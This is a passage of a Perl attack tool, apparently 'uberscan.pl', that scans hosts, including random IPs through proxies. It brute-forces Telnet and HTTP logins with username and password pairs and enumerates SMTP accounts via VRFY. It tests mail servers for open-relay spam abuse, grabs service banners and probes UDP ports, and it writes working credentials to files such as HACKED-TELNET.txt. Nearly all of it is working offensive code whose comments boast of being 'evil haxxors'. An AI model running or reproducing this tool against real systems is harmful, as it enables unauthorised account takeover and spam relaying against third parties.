				print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
				print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
				print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
				$filename = "errors.txt";
				$addenda = "SMTP reply / error code: $smtp_code";
				WriteScrewupReport();
				$conn_error = "no";
			}
				# There follows an annoying multi-line banner thingie
			elsif ($reply =~ "220-We do not authorize the use of this system to transport unsolicited,")	{
				until ($reply =~ "ello" || $reply =~ "reetings" || $reply =~ "gmail" || $smtploop ==5)	{
					print "\n ** Getting multi-line response, looping: $smtploop Reply:";
					$reply = <$socket>;
					if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
						$addenda = "Timed out while still connected, will re-try if possible...";
						$conn_error = "yes";
						$filename = "errors.txt";
						WriteScrewupReport();
					}					
					print $reply;
					$smtploop++;
				}	# closes annoying multi-line banner UNTIL block
			}	# closes annoying multi-line banner  ELSIF block
			
			################## TRY SENDING A VRFY COMMAND #####################
			unless ($novrfy_option eq "ON")	{
				print "\n Trying command $usernamelogon \n";
				print $socket $usernamelogon;		 	
				$reply = <$socket>;
				
				if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
					$addenda = "Timed out while still connected, will re-try if possible...";
					$conn_error = "yes";
					$filename = "errors.txt";
					WriteScrewupReport();
				}				
				print "\n Reply is:";
				print $reply;
				$smtp_code = substr ($reply,0,3);

				######### PROCESS REPLY TO VRFY #######################

				# Deals with all exceptions to VRFY command

				# If reply comes back empty, some sort of connection error
				unless (defined $reply && $reply ne '')	{
					print "## Reply not defined - probably a timeout bug?? Retrying...## ";
					print "##### Couldn't connect to $remote_host $remote_port | $! #### \n";
					print "##### Username attempting to verify was $username  #### \n";
					$conn_error = "yes";
					$addenda = "Tried to VRFY with $username but server gave no reply";
					$filename = "errors.txt";
					WriteScrewupReport();
					close ($socket);
					return;
				}
				
					# Found a username
				elsif ($smtp_code eq "200" || $smtp_code eq "250" || $smtp_code eq "220" || $smtp_code eq "211")	{
					####### YAAAY SUCESSSS!!!! ######
					$addenda = "Congratulations! We seem to have found a valid SMTP account!";
					PrintSuccessHack();
					$filename = "HACKED-SMTP.txt";
					WriteCorrectPasswordReport();
				}
					####### / SUCCESS!!!!! ######
	
					# Deals with exception where server can't process VRFY commands
				elsif ($reply =~ "Command unrecognized" or 
				$reply =~ "Command rejected" or
				$reply =~ "Administrative prohibition" or
				$reply =~ "VRFY command is disabled"or 
				$smtp_code eq "500" or
				$smtp_code eq "502")	{
					chomp $banner;			# The trailing newlines were really annoying me
					chomp $usernamelogon;	# so off with their heads!
					chomp $reply;
					$addenda = "\n #### CAN'T VERIFY USERNAMES ON THIS SERVER: ####";
					print $addenda;
					print $addenda;
					print $addenda;
					print $addenda;
					$filename = "non-verifying-SMTP servers";
					$verbal_report = "\n #################################################";
					$verbal_report .= $addenda;
					$verbal_report .= "\n # Host: $remote_host Port: $remote_port\t\t\t#";
					$verbal_report .= "\n # Banner: $banner #";
					$verbal_report .= "\n # Last command: $usernamelogon #";
					$verbal_report .= "\n # Last reply: $reply #";
					$verbal_report .= "\n # SMTP return / error code: $smtp_code\t\t#";
					$verbal_report .= "\n # (it could still be used to send spam though) # ";
					$verbal_report .= "\n ################################################";
					$verbal_report .= "\n\n\n";
					print $verbal_report;
					WriteReportFile();
					$conn_error = "no";
				}
					# Deals with exception where server needs a full email in VRFY
				elsif  ($reply =~ "must contain a domain"or
				$smtp_code eq "501")	{
					chomp $banner;			# The trailing newlines were really annoying me
					chomp $usernamelogon;	# so off with their heads!
					chomp $reply;
					$addenda = "\n ### THIS SERVER NEEDS FULL EMAIL ADDRESSES IN VRFY COMMANDS: ####";
					print $addenda;
					print $addenda;
					print $addenda;
					print $addenda;
					$filename = "need-full-email-for-VRFY.txt";
					$verbal_report = "\n ################################################################";
					$verbal_report .= $addenda;
					$verbal_report .= "\n # Host: $remote_host Port: $remote_port\t\t\t\t#";
					$verbal_report .= "\n # Banner: $banner #";
					$verbal_report .= "\n # Last command: $usernamelogon\t\t\t\t\t#";
					$verbal_report .= "\n # Last reply: $reply #";
					$verbal_report .= "\n # SMTP return / error code: $smtp_code\t\t\t\t #";
					$verbal_report .= "\n # Please re-try the VRFY command with full email addresses.\t #";
					$verbal_report .= "\n\n\n";
					print $verbal_report;
					WriteReportFile();
					$conn_error = "no";		
				}
					# Deals with exception where server can't verify a user because they probably don't exist
				else	{	 
					print "\n Error message from server, command $usernamelogon failed ";
					print "or user $username does not exist";
					$filename = "SMTPwrongusernames.txt";
					$addenda = "Couldn't VRFY, $username probably doesn't exist";
					WriteWrongPasswordReport();
				}
			}	# Closes "unless ($novrfy_option eq "ON") " block earlier
			
			#################### TEST TO SEE IF VULNERABLE TO SPAMMERS #################
			if ($spamcheck_option eq "ON")	{
				print "\n";
				print "\n Testing to see if vulnerable to spammer abuse:";
				print $socket "MAIL FROM: spammer\@spamland.com\n";
				print "\n";
				$reply = <$socket>;
				if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
					$addenda = "Timed out while still connected, will re-try if possible...";
					$conn_error = "yes";
					$filename = "errors.txt";
					WriteScrewupReport();
				}				
				
				print $reply;
				$smtp_code = substr ($reply,0,3);
				print "\n";
				if ($smtp_code eq "250")	{
					print $socket "RCPT TO: somepoorsod\@hotmail.com\n";
					print $reply;
					$smtp_code = substr ($reply,0,3);
					if ($smtp_code eq "250")	{
						######### VULNERABLE TO SPAMMERS WARNING #############
						$verbal_report = "\n ##########################################";
						$verbal_report .= "\n # THIS SERVER IS VULNERABLE TO SPAMMERS! #";
						$verbal_report .= "\n # IP address: $remote_host Port: $remote_port   #";
						$verbal_report .= "\n # Accepts MAIL FROM and RCPT TO commands #";
						$verbal_report .= "\n # without authentication. That means it  #";
						$verbal_report .= "\n # can be used to send spam!  :-( :-( :-( #";
						$verbal_report .= "\n #########################################";
						$verbal_report .= "\n ";
						print $verbal_report;
						$filename = "SMTP-SPAMWARNING.txt";
						WriteReportFile();
					}
				}
			}	# Closes the block that tests: if ($spamcheck_option eq "ON")
			$conn_error = "no";
			$retry = 0;
			close ($socket);
		}	# Closes the else block that starts with "Sending HELO..." 
	}	# Closes the "if ($socket... " block near the start of this subroutine
	else	{ 
		print "\n##### Couldn't connect to $remote_host $remote_port | $! #### \n";
		print "#####  Retries: $retry  Command: $usernamelogon ";
		$conn_error = "yes";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all. ";
			$filename = "errors.txt";
			WriteScrewupReport();
		}
	}
}




######################### HACKTELNET ################################################


sub HackTelnet {
	
	use Net::Telnet;

	my $keyboardnothing = "Leave this for input from stdin";
	my @telnet_output = "undefined";
	my $telnet_output_array_loopcount = 0;
	my $telnet = "undefined";
	my $telnet_error = "undefined";
	my $telnetsesh = "undefined";

	print "\n HackTelnet: Hacking $remote_host on port $remote_port with username $username and password $password";
	print "\n";

	my $catch_conn_err = eval	{$telnetsesh = Net::Telnet->new
		(Timeout=>$timeout,
		Host=>$remote_host,
		Port=>$remote_port,
		Errmode=>'die')
	};	
 
	if ( $@ )	{
		$telnet_error = $@;
		print "\n Caught telnet_error connecting: $telnet_error";
		$conn_error = "yes";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all. ";
			$addenda .= "\n # Eval error:$@ ** System error:$!";
			$filename = "errors.txt";
			WriteScrewupReport();
		}
	}
	else	{															
		print "\n Connected!";											
		print "\n telnet_sesh: $telnetsesh";							
		print "\n";
		print "\n Trying to log in...";
		print "\n";
		my $catch_login_err = eval { $telnetsesh->login($username, $password) };
		if ( $@ )	{
			$telnet_error = $@;
			print "Caught login error! telnet_error = $telnet_error \n";
			if ( $@ =~ m/bad name or password/i )	{
				$conn_error = "no";
				$reply = $telnet_error;
				$addenda = "\n Wrong password... \n";
				$addenda .= "\n # Eval error:$@ ** System error:$!";
				print $addenda;
				$filename = "Telnetwrongpasswords.txt";
				WriteWrongPasswordReport();
			}
			else	{
				$conn_error = "yes";
				print "\n You probably timed out; usually this happens when the server connects, but does not respond.";
				print "\n Perhaps it's waiting for you to talk, or is overloaded with other users.";
				print "\n Writing data to errors.txt file, just incase \n";
				if ($logall eq "ON")	{
					$reply = $telnet_error;
					$addenda = "Banal error: Connects but server won't talk- too many connections to server?";
					$addenda .= "\n # Eval error:$@ ** System error:$!";
					$filename = "errors.txt";
					WriteScrewupReport();
				}
			}
		}
		else{	####### YAAAY SUCESSSS!!!! ######
			
			$addenda = "Congratulations! We seem to have found a valid Telnet account!";
			PrintSuccessHack();
			$conn_error = "no";
			$filename = "HACKED-TELNET.txt";
			WriteCorrectPasswordReport();
			GetWhoIsInfo();		
			print "\n Completed login sequence.";
			my $quit_err = eval { $telnetsesh->cmd('quit') };
			if ( $@ )	{
				print "\n Caught error logging off! Who cares, I was quitting anyway... \n";
				$reply = $@;
				$addenda = "Error quitting a successful telnet session, this is just for the record";
				$addenda .= "\n # Eval error:$@ ** System error:$!";
				$filename = "errors.txt";
				WriteScrewupReport();
			}
			print "\n Logged out of telnet session, one way or another...";
		}  ######## / SUCCESSS ###########
		print "\n Telnet sequence complete. Have a nice day!\n";

	}
	undef $reply;
}


################################### HACKHTTP ###################################################
#
# This was quite hard to write. LWP didn't work on SOCKS proxies, only
# HTTP proxies, so that was out. 
# 
# Low-level socket connections had a habit of dying for no reason
# so I ended up using cURL... which has its own... issues, but at least it works!
# (though I haven't actually been able to get any logins with it myself -
# Please email me with any critiques you may have so I can improve on it!)
#

sub HackHTTP	{
	
	use WWW::Curl::Easy;
	use HTTP::Request;


	my @HTTP_reply = "undefined";
	my $uri = $remote_host.':'.$remote_port;
	my $url = 'http://'.$remote_host.':'.$remote_port.'/';
	my $request = "request - undefined";
	my $response = "response - undefined";
	my $webpage;
	my $UserAgent;
	my @ns_headers = (
	'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1',
	'Accept' => 'text/html, */*',
	'Accept-Charset' => '*/*',
	);
	my $headers = HTTP::Headers ->new(@ns_headers);

	my $realm_data_pos ;
	my $realm;
	my $choplength;

	print "\n";
	print "\n HackHTTP: Hacking $remote_host on port $remote_port with username $username and password $password";
	print "\n";
	print "uri: $uri";
	print "\n url: $url \n ns_headers: @ns_headers";
	print "\n";

	my $curlAgent= WWW::Curl::Easy->new;

	$curlAgent->setopt(CURLOPT_HEADER,1);
	$curlAgent->setopt(CURLOPT_URL,$url);
	$curlAgent->setopt(CURLOPT_WRITEDATA,\$foreign_headers); # This looks like a nasty bug but isn't, honest!
	
	$return_code = $curlAgent->perform;

	print "\n";
	print "Return code: $return_code";
	print "\n";

	if ($return_code == 0)	{
		print "\n";
		print "Connected OK!";
		$response_code = $curlAgent->getinfo(CURLINFO_HTTP_CODE);
		print "\n";
		print "Response code is $response_code";
		$conn_error = "no";
		print "\n";
	
		unless ($response_code == 401 || $response_code == 403)	{
			print "\n Doesn't need authentication...";		
			print "\n url:\n $url\n";
			if ($debug)	{
				print "Saving webpage to webpages.txt;"; # Change back to html when you get the webpage
				$filename = "webpages.txt";
				$verbal_report = "+++ Host: $remote_host  Port: $remote_port +++ <BR>";
				$verbal_report .= "\n +++ Username: $username Password: $password (irrelevant, this page did not require authentication) +++ <BR>";				
				$verbal_report .= "\n ++ Response code: $response_code ++ <BR>";
				$verbal_report .= "\n<B>++++ Webpage & headers follow: ++++++ </B> </CENTER><P><BR> \n";
				$verbal_report .= "\n ++\n\n<P><P> $foreign_headers \n\n<P><P> ++ <BR>";
				WriteReportFile();
				$conn_error = "no";
				$retry = 0;
				$foreign_headers = "";
			}
			
		}
		elsif ($response_code eq '401' || 
		$response_code eq '403' || 
		$response_code == 401 ||
		$response_code == 403) {
			print "\n";
			print "This site requires authentication. Good, because that's my job.";
			$curlAgent->setopt(CURLOPT_HTTPAUTH, CURLAUTH_ANY);
			$curlAgent->setopt (CURLOPT_USERPWD, "$username:$password");
			print "\n Performing authentication attempt....";
			$return_code = $curlAgent->perform;
			print "\n";
			if ($return_code == 0)	{
				print "\n Sucessfully passed the username and password to the server.";
				$conn_error = "no";
				$retry = 0;
				print "\n";
				print "foreign headers: $foreign_headers";
				$response_code = $curlAgent->getinfo(CURLINFO_HTTP_CODE);
				print "\n\n";
				print "Response code is $response_code";
				if ($response_code eq '401' || # I'm pretty sure that servers differ
				$response_code eq '403' || # in the exact response style.
				$response_code eq '0' ||   # Basically perl is nuts!
				$response_code == 401 || 
				$response_code == 403 || 
				$response_code == 0)	{
					print "Response code 401 (unauthorized).. ( $response_code )";
					print "\n Bad username & password. Maybe next time...";
					$filename = "HTTPwrongpasswords";
					WriteWrongPasswordReport();
					$conn_error = "no";
				}
				elsif ($response_code == 200)	{ 	
							####### YAAAY SUCESSSS!!!! ######
					$addenda = "Congratulations! We seem to have found a valid HTTP account!";
					PrintSuccessHack();
					$filename = "HACKED-HTTP.txt";
					WriteCorrectPasswordReport();
					GetWhoIsInfo();	
					$conn_error = "no";
					$retry = 0;
							######### / SUCCESS!!!!!! #########
				}
				elsif ($response_code ne '200' && $response_code ne '401')	{
					print "Response code neither OK NOR unauthorized - timed out or we got kicked? Retrying...";
					print "##### Couldn't connect to $remote_host $remote_port | $! #### \n";
					print "##### Username was $username and password was $password  #### \n";
					$conn_error = "yes";
					$filename = "errors.txt";
					$addenda = "Couldn't connect to host";
					$addenda .= "\n # Eval error:$@ ** System error:$!";
					WriteScrewupReport();
					$conn_error = "yes";
				}
			}
			else {
				print "\n  Other connection error: $!";
				$conn_error = "yes";
				print "\n";
				print "Response code was $response_code";
				print "\n Return code was $return_code ";
				print "\n";
				print "foreign headers: $foreign_headers";
				print "Getting new response code...\n";
				$response_code = $curlAgent->getinfo(CURLINFO_HTTP_CODE);
				print "\n\n";
				print "Response code is $response_code";
				print "\n";
				$filename = "errors.txt";
				$addenda = "Other connection error in HackHTTP";
				$addenda .= "\n # Eval error:$@ ** System error:$!";
				WriteScrewupReport();
			}
		}
	}
	else	{	# This may be being tripped due to going through SOCKS proxies....
		print "\n";
		print "Failed to connect at all!";
		print "\n";
		$response_code = $curlAgent->getinfo(CURLINFO_HTTP_CODE);
		print "\n";
		print "Response code is $response_code";
		print "\n";
		print "##### Couldn't connect to $remote_host $remote_port | $! #### \n";
		print "##### Username was $username and password was $password  #### \n";
		$conn_error = "yes";
		print "\n Error code is $! \n";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all. ";
			$addenda .= "\n # Eval error:$@ ** System error:$!";			
			$filename = "errors.txt";
			WriteScrewupReport();
		}
	}
}



############################### HACKUDP #################################

sub HackUDP	{
	
	use Socket;
	
	my $socket_data;
	my $readable_recv_data = "";
	my $readable_socket_data = "";
	my $readable_response_data = "";
	my $chrloop = 0;
	my $broadcastAddr;
	my $response;
	my $custom_remote_host;
	my $recv_data;
	my $recv_loop;
	my $max_recv_loop = 655355;
	#my $max_recv_loop =  353123;
	my $fuzzchar;
	if ($megahack) {$max_recv_loop = 353123;}	# About 55% of the time given to regular scan
											# Another way to do the megahack: Fork it!
											
		
		# OK, it "works" about as well as it's going to.
		# Problem: Takes two minutes to do over a thousand ports.
		# So doing all 65535 ports will take about 2 hours
		# Need a mode that will do the first 1024 ports (like nmap)
		
		# WHAT TO CALL IT?
		# "all" is inaccurate. And it's taken.
		# "most" also inaccurate
		# I will use "reserved".
		
		# Parallelizing it would take about 40 forked processes to do one IP in one minute.				
		# Could fork it on a an until loop
		# until = 65535 ports with a one or two-second pause every forty forks?
		# How about a wait() command in HackMaster every forty forks?
		
	# Crude, but works on single ips!
	#  TO-DO:
	# Automatically disable port scanning when this option is selected;
	# Option to search a range of ports, or all ports for luvly servers!
	
	#use Socket qw(:all);		# If anything goes wrong, these are the suspects!
	#use POSIX ":sys_wait_h";
	
	socket( SOCKET, PF_INET, SOCK_DGRAM, getprotobyname("udp") )
		or die "Error: can't create an udp socket: $!\n";
	
	#select( ( select(SOCKET), $|=1 )[0] ); # no suffering from buffering
	
	select (SOCKET);	# A more legible way of doing the commented out code above!
	$|=1;
	
	$custom_remote_host = inet_aton($remote_host);
	print STDOUT "\n remote_host:$remote_host. \t remote_port:$remote_port";
	print STDOUT "\n";
	
	$response = $broadcastAddr = sockaddr_in($remote_port, $custom_remote_host); # Crashes on $remote_host variable
	print STDOUT "\n ";
	print STDOUT "\n broadcastAddr sockaddr_in response:$response \$!:$! \$\@:$@";
	print STDOUT "\n setsockopt response:$response \$!:$! \$\@:$@";
	print STDOUT "\n ";
	
	$response = send( SOCKET, $string_to_send, 0, $broadcastAddr );

=begin commment  dont' use this code!

	if ($stringorder == 1)	{
		$response = send( SOCKET, $string_to_send, 0, $broadcastAddr );
	}
	else	{
		until ($recv_loop == $max_recv_loop || length ($recv_data) > 0)	{
			$response = recv( SOCKET, $recv_data, 1024, MSG_DONTWAIT );
			$recv_loop++;
		}
		
	 }
=end comment;
=cut

	$chrloop = 0;
		until ($chrloop == length($response) )	{
		$readable_response_data .= ord(substr($response,$chrloop));
		$readable_response_data .= ",";
		$chrloop++;
	}	
	print STDOUT "\n UDP response: (send):$response \t Readable response data:$readable_response_data";
	print STDOUT "\n";	
		
	
	# THIS MAY NEED SETTING UP AGAIN ##########
	until ($recv_loop == $max_recv_loop || length ($recv_data) > 0)	{
		$response = recv( SOCKET, $recv_data, 1024, MSG_DONTWAIT );
		$recv_loop++;
	}
	
	print STDOUT "\n recv response:$response recv_data:$recv_data \$!:$! \$\@:$@";
	
	close SOCKET;
	
	select (STDOUT);
	print "\n ";
	if ( length ($recv_data) > 0)	{
		print STDOUT "\n*******************************************************";
		print STDOUT "\n* FOUND A UDP PORT AT $remote_host port $remote_port *";
		print STDOUT "\n*******************************************************";
		$addenda = "FOUND A UDP PORT AT $remote_host port $remote_port";
		$reply = $recv_data;
		$filename = "HACKED-UDP-port$remote_port.txt";
		$usernamelogon = $string_to_send;	# bit kludgy I know
		WriteCorrectPasswordReport();
		$conn_error = "no";		
	}
	undef $response;
	undef $recv_data;
	print "\n******************** $megahack ******remote port:$remote_port ******************************";
	statistics();
	#print "\n ** $scantype * UPTIME:$minutesup mins * IPS/MIN:$ipspermin * times_looped:$times_looped * IPs Generated:$ips_generated * $megahack **\n";
	print "\n******************** $megahack ******remote port:$remote_port ******************************";
	print "\n";
}
	
	














############################### HACKCUSTOM ################################

# For use with -sendstring: (?)
sub HackCustom	{
	
	use IO::Socket::INET;
	use IO::Socket::Timeout;
	
	print "\n HackCustom: Connecting to $remote_host port $remote_port to send $string_to_send....\n";
	if ($socket = IO::Socket::INET->new 
	(PeerAddr => $remote_host,
	PeerPort => $remote_port,
	Proto => $protocol,
	Type => SOCK_STREAM,
	Timeout => $timeout))	{
		print "\n";
		statistics();
		print "Setting up timeout....";
		IO::Socket::Timeout->enable_timeouts_on($socket);
		$socket->read_timeout($timeout);
		$socket->write_timeout($timeout);
		
		
		if ($stringorder eq "random")	{
			# toss a coin to decide whether to send string first or second
			# BOOKMARK - UNFINISHED CODE!!!
		}

		if ($stringorder eq "1")	{
			print "\n";
			print "\n Sending $string_to_send\n"...
			print $socket $string_to_send;
			print "\n Sent!";
			print "\n";
		}
		print "\n";
		
		print "Connected, fetching banner...";
		$reply = <$socket>;
		#if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
		if (!$reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
			$addenda = "Timed out while still connected, will re-try if possible...";
			$conn_error = "yes";
			$filename = "errors.txt";
			WriteScrewupReport();
		}				
		elsif ($reply ne '')	{		
				####### YAAAAY SUCCESSS !!! #####
			print "\n ############ \n # Banner found! # \n ############ \n";
			$banner = $reply;
			print "\n Banner:$reply";
			print "\n";
			$addenda = "We've found a banner on port $remote_port";
			$filename = "HACKED-BANNERS-port$remote_port.txt";
			WriteCorrectPasswordReport();
			$conn_error = "no";
		}		####### / SUCCESSS !!! #########
		else	{
			print "\n Connected, but no banner found.";
			print "\n This is probably because port $remote_port on $remote_host is closed, ";
			print "\n but it'd be remiss not to check it, so re-trying (unless we're ";
			print "\n in random mode) \n";
			$conn_error = "yes";
			if ($logall eq "ON")	{
				$addenda = "Banal error: Connects but server won't talk- too many connections to server?";
				$addenda .= "\n # Eval error:$@ ** System error:$!";				
				$filename = "errors.txt";
				WriteScrewupReport();
			}
		}
	}
	else	{
		print "\n ## No connection. Bah! ##";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all. ";
			$addenda .= "\n # Eval error:$@ ** System error:$!";
			$filename = "errors.txt";
			WriteScrewupReport();
		}
	}
}





















########################### SEARCHOPEN ###############################

sub SearchOpen	{
	
	print "\n SearchOpen: Searching for an open port at $remote_host port $remote_port...";
	PortScan();
	
	if ($port_test eq "FAILED")	{
		print "\n port test failed! Next...";
	}
	else	{
		print "\n Found an OPEN PORT on port $remote_port at $remote_host!";
		$filename = "OPEN-PORTS$remote_port.txt";
		WriteCorrectPasswordReport();
		$conn_error = "no";
	}
}
# BOOKMARK
# ( This probably won't work first time - needs testing! )


	

############################### HACKBANNER ################################

sub HackBanner	{
	
	use IO::Socket::INET;
	use IO::Socket::Timeout;
	
	print "\n HackBanner: Connecting to $remote_host port $remote_port in search of bannery goodness....\n";
	if ($socket = IO::Socket::INET->new 
	(PeerAddr => $remote_host,
	PeerPort => $remote_port,
	Proto => $protocol,
	Type => SOCK_STREAM,
	Timeout => $timeout))	{
		print "\n";
		statistics();
		print "Setting up timeout....";
		IO::Socket::Timeout->enable_timeouts_on($socket);
		$socket->read_timeout($timeout);
		$socket->write_timeout($timeout);
		
		
		print "Connected, fetching banner...";
		$reply = <$socket>;
		if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
			$addenda = "Timed out while still connected, will re-try if possible...";
			$conn_error = "yes";
			$filename = "errors.txt";
			WriteScrewupReport();
		}				
		elsif ($reply ne '')	{		
				####### YAAAAY SUCCESSS !!! #####
			print "\n ############ \n # Banner found! # \n ############ \n";
			$banner = $reply;
			print "\n Banner:$reply";
			print "\n";
			$addenda = "We've found a banner on port $remote_port";
			$filename = "HACKED-BANNERS-port$remote_port.txt";
			WriteCorrectPasswordReport();
			$conn_error = "no";
		}		####### / SUCCESSS !!! #########
		else	{
			print "\n Connected, but no banner found.";
			print "\n This is probably because port $remote_port on $remote_host is closed, ";
			print "\n but it'd be remiss not to check it, so re-trying (unless we're ";
			print "\n in random mode) \n";
			$conn_error = "yes";
			if ($logall eq "ON")	{
				$addenda = "Banal error: Connects but server won't talk- too many connections to server?";
				$addenda .= "\n # Eval error:$@ ** System error:$!";				
				$filename = "errors.txt";
				WriteScrewupReport();
			}
		}
	}
	else	{
		print "\n ## No connection. Bah! ##";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all. ";
			$addenda .= "\n # Eval error:$@ ** System error:$!";
			$filename = "errors.txt";
			WriteScrewupReport();
		}
	}
}
###############################  PRINTSCANOPTIONS #################################

sub PrintScanOptions	{
	print "\n Scan options are (precede with '-scantype:')";
	print "\n\t SSH";
	print "\n\t POP3 ";
	print "\n\t HTTP";
	print "\n\t Telnet";
	print "\n\t FTP ";
	print "\n\t SMTP ";
	print "\n\t udpall ";
	print "\n\t udpnnn (where nnn is a number) ";
	print "\n\t searchopen";
	#print "\n\t all (unimplemented)";
	#print "\n\t Yo' mama (unimplemented)";
	print "\n ";
	print "\n You tried:";
	print "\n   uberscan.pl @input";
	print "\n "; 
}




###################################### STATISTICS ###################################
sub statistics	{

	if ($forktimes > 0) {
		$ips_generated += $forktimes;
	} else {
		$ips_generated = $times_looped;
	}
	$timenow = time();
	$uptime = $timenow - $starttime;
	$minutesup = int($uptime / 60);
	if ($minutesup > 0)	{
		$ipspermin = int($ips_generated / $minutesup);
	}
	if ($ip_option =~ '-random_ip' || $ip_option =~ '-RANDOM_IP')	{
		print "\n ** PID:$$ * $scantype * Up $minutesup mins * IPS/MIN:$ipspermin * looped:$times_looped * IPs:$ips_generated * port:$remote_port **\n";
	}
	else {
		print "\n ** PID:$$ * $scantype * UPTIME:$minutesup mins * IPS/MIN:$ipspermin * Connection Attempts (incl. errors):$times_looped **\n";
	}
	if ($maxmins && $minutesup >= $maxmins) {
		die "\n Finished executing, you requested I stop running after $maxmins minutes so I did. Bye!\n\n";
	}
}




##################### WriteCorrectPasswordReport ########################

sub WriteCorrectPasswordReport	{
	$login_found = "YES";
#	if ($save_to_custom_file) {$filename = $save_to_custom_file;}
	$verbal_report = "\n #################  HOST AND LOGIN / PASSWORD FOUND !  ###################################";
	$verbal_report .= "\n # SCANTYPE:$scantype *  UPTIME:$minutesup mins * IPS/MIN:$ipspermin * times_looped:$times_looped * IPs Generated:$ips_generated ##";
	$verbal_report .= "\n # Host: $remote_host  *  Port: $remote_port * Retries: $retry * PID:$$";
	$verbal_report .= "\b # Time: ";
	$verbal_report .= localtime();
	$verbal_report .= "\n # Banner (if applic):$banner";
	$verbal_report .= "\n # Username: $username * Password: $password";
	$verbal_report .= "\n # Command: (where applic) $usernamelogon";
	$verbal_report .= "\n # Reply:$reply#";
	$verbal_report .= "\n # Addenda: $addenda";
	$verbal_report .= "\n #########################################################################################";
	$verbal_report .=  "\n\n\n";
	WriteReportFile();
}


##################### WriteWrongPasswordReport ############################

sub WriteWrongPasswordReport	{		
	unless ($debug)	{return;}	# Do not run if the debug option isn't set.
	$verbal_report = "\n ###########    HOST FOUND, BUT USERNAME AND / OR PASSWORD WERE WRONG    ################";
	$verbal_report .= "\n # SCANTYPE:$scantype  * UPTIME:$minutesup mins * IPS/MIN:$ipspermin * times_looped:$times_looped * IPs Generated:$ips_generated";
	$verbal_report .= "\n #   Host: $remote_host  *  Port: $remote_port  *  Retries: $retry * PID:$$";
	$verbal_report .= "\n # Banner (if applic): $banner";
	$verbal_report .= "\n #   Username: (wrong) $username  *  Password: (wrong) $password ";
	$verbal_report .= "\n # Reply:$reply#";
	$verbal_report .= "\n # Addenda: $addenda";
	$verbal_report .= "\n #######################################################################################";
	$verbal_report .=  "\n\n\n";
	WriteReportFile();
}


########################### WriteScrewUpReport #############################


sub WriteScrewupReport	{
	unless ($debug)	{return;}	# Do not run if the debug option isn't set.
	$verbal_report = "\n ######################################################################################";
	$verbal_report .= "\n # SCANTYPE:$scantype * UPTIME:$minutesup mins * CONN/MIN:$ipspermin * times_looped:$times_looped * Connections:$ips_generated ";
	$verbal_report .= "\n #              SOME SORT OF SCREWUP...                                              #";
	$verbal_report .= "\n # May have connected, but didn't get a username / password in.                      #";
	$verbal_report .= "\n #-----------------------------------------------------------------------------------#";
	$verbal_report .= "\n #   Host: $remote_host  *  Port: $remote_port Retries: $retry  PID:$$";
	$verbal_report .= "\n # Banner (if applic): $banner";
	$verbal_report .= "\n # Username: $username  *  Password: (where applic) $password ";
	$verbal_report .= "\n # Command: (where applic)  *   $usernamelogon \t ";
	$verbal_report .= "\n # HTTP response code: (if applic) $response_code ";
	$verbal_report .= "\n # HTTP return code: (if applic) $return_code ";
	$verbal_report .= "\n # foreign_headers / webpage (if applic) $foreign_headers";
	$verbal_report .= "\n # Reply:$reply# \t ";
	$verbal_report .= "\n # Addenda: $addenda ";
	$verbal_report .= "\n ######################################################################################";
	$verbal_report .=  "\n\n\n";
	WriteReportFile();
}

############################### WriteReportFile #############################

sub WriteReportFile	{	

#	my $syn_result = shift;
	my $special = shift;
	my $report_file_wait = 0;
	my $old_dollarbar;
	my $procid;

	if ($csv_option eq "ON" && $filename ne "webpages.txt" && !$special) {
		$procid = $$;
		$verbal_report ="$procid,$scantype,$remote_host,$remote_port,$username,$password,$minutesup\n";
	}
	
	############### THIS IS FOR DEBUGGING THE PORT SCANNER, COMMENT OUT. #############
	if ($special)	{
		$procid = $$;
		#$verbal_report .="$syn_result,";
		#$verbal_report .="$scan_result,";
		$verbal_report .="$procid,$scantype,$remote_host,$remote_port,$username,$password,$minutesup\n";
	}
	#####################################################################################
	
	sysopen (REP, "$filename", O_WRONLY |O_APPEND | O_CREAT) or disasterola();	
	$old_dollarbar = local $|;
	until (flock (REP, LOCK_EX) )	{
		print "\n Waiting for lock on $filename to write $verbal_report, looped $report_file_wait times \n";
		local $| = 1;
		flock (REP, LOCK_EX) or disasterola();
		$report_file_wait++;
	}
	printf (REP "$verbal_report");
	close (REP);
#	flock (REP, LOCK_UN) or disasterola(); # Uncomment this if you hget a lot of errors using this routine
	$shell = `chmod +666 $filename`;	# In case we're running as a Superuser
}

################################### DISASTEROLA ################################

sub disasterola	{
# THIS IS AN INFINITE LOOP. REASON: Multitasking wld scroll a normal error message off the screen.
	DISASTER:	
	print "\n\n SHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHITOHSHIT";
	print "\n **";
	print "\n *** Objectivity lost, file system inacessible accessing $filename or network! ***";
	print "\n **";
	print "\n ***	ARE YOU ROOT?	ARE YOU ROOT?	ARE YOU ROOT?	***";
	print "\n ***	ARE YOU ROOT?	ARE YOU ROOT?	ARE YOU ROOT?	***";
	print "\n ***	ARE YOU ROOT?	ARE YOU ROOT?	ARE YOU ROOT?	***";
	print "\n **";
	print "\n **	HAVE YOU SET A FILENAME? \t Check \$filename.	**";
	print "\n **	HAVE YOU SET A FILENAME? \t Check \$filename. 	**";
	print "\n **	HAVE YOU SET A FILENAME? \t Check \$filename.	**";
	print "\n **";
	print "\n **";
	print "\n ** verbalreport (where applic): \n $verbal_report **";
	print "\n ***             Host: $remote_host   Port: $remote_port   PID:$$               *** ";
	print "\n ***           username: $username  Password: $password                  ***";
